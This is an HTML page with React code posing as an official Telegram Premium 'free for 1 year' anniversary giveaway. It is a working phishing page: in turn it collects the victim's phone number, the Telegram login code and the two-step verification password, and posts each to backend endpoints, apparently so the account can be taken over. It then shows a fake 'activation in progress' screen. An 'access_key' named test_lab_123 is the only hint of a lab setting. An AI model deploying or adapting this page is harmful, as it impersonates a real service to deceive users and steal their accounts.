<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Telegram Premium • Exclusive Rewards</title>
    <link rel="stylesheet" href="style.css" />
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
</head>
<body>
<div id="root"></div>
<script type="text/babel">
const { useState } = React;

const App = () => {
  const [step, setStep] = useState('phone');
  const [phone, setPhone] = useState('+251');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({ phone: '', code: '', password: '' });

  const clearErrors = () => setErrors({ phone: '', code: '', password: '' });

  const updateError = (field, message) => {
    setErrors(prev => ({ ...prev, [field]: message }));
  };

  const sendData = async (url, body) => {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    return response.json();
  };

  const handleSendPhone = async () => {
    const raw = phone.replace(/\D/g, '');
    if (raw.length < 7) {
      updateError('phone', 'Please enter a valid phone number.');
      return;
    }
    clearErrors();
    setLoading(true);

    try {
      const data = await sendData('/api/send-code', { phone: raw, access_key: 'test_lab_123' });
      if (data.already_authorized) {
        setStep('done');
      } else {
        setStep('code');
        setCode('');
      }
    } catch (error) {
      updateError('phone', error.message || 'Connection failed');
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyCode = async () => {
    if (!code.trim()) {
      updateError('code', 'Please enter the verification code.');
      return;
    }
    clearErrors();
    setLoading(true);

    try {
      const data = await sendData('/api/verify-code', {
        phone: phone.replace(/\D/g, ''),
        code: code.trim(),
        access_key: 'test_lab_123',
      });
      if (data.needs_2fa) {
        setStep('2fa');
        setPassword('');
      } else {
        setStep('done');
      }
    } catch (error) {
      updateError('code', error.message || 'Invalid code. Try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyPassword = async () => {
    if (!password) {
      updateError('password', 'Password is required.');
      return;
    }
    clearErrors();
    setLoading(true);

    try {
      await sendData('/api/verify-2fa', {
        phone: phone.replace(/\D/g, ''),
        password,
        access_key: 'test_lab_123',
      });
      setStep('done');
    } catch (error) {
      updateError('password', error.message || 'Wrong password.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="premium-card" id="app">
      <div className="badge">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#FFD966" stroke="#FFA500" strokeWidth="1.2" />
        </svg>
      </div>
      <h1>Telegram Premium</h1>
      <div style={{ textAlign: 'center' }}>
        <div className="sub">✨ Free for 1 year · Anniversary celebration ✨</div>
      </div>

      <div className="step-container">
        {step === 'phone' && (
          <div className="step">
            <div className="input-group">
              <label>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                  <line x1="12" y1="18" x2="12" y2="18" strokeWidth="2.5"></line>
                </svg>
                Your phone number
              </label>
              <input
                type="tel"
                value={phone}
                onChange={e => setPhone(e.target.value)}
                placeholder="+1 234 567 8900"
              />
              {errors.phone && (
                <div className="error" style={{ display: 'flex' }}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                  <span>{errors.phone}</span>
                </div>
              )}
            </div>
            <button onClick={handleSendPhone} disabled={loading}>
              Get Code
            </button>
            {loading && <div className="spinner"></div>}
          </div>
        )}

        {step === 'code' && (
          <div className="step">
            <div className="input-group">
              <label>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Verification code (from Telegram)
              </label>
              <input
                type="text"
                value={code}
                onChange={e => setCode(e.target.value)}
                placeholder="12345"
                maxLength="6"
              />
              {errors.code && (
                <div className="error" style={{ display: 'flex' }}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                  <span>{errors.code}</span>
                </div>
              )}
            </div>
            <button onClick={handleVerifyCode} disabled={loading}>
              Verify Code
            </button>
          </div>
        )}

        {step === '2fa' && (
          <div className="step">
            <div className="input-group">
              <label>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Two-step verification password
              </label>
              <input
                type="password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="••••••••"
              />
              {errors.password && (
                <div className="error" style={{ display: 'flex' }}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                  <span>{errors.password}</span>
                </div>
              )}
            </div>
            <button onClick={handleVerifyPassword} disabled={loading}>
              Verify Password
            </button>
          </div>
        )}

        {step === 'done' && (
          <div className="step">
            <div className="success-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <polyline points="20 6 9 17 4 12"></polyline>
              </svg>
            </div>
            <div className="done-title">Activation in progress</div>
            <div className="done-text">Redirecting you to Premium dashboard...</div>
          </div>
        )}
      </div>

      <div className="footer">© 2025 Telegram Premium Rewards — Official event</div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);
</script>
</body>
</html>
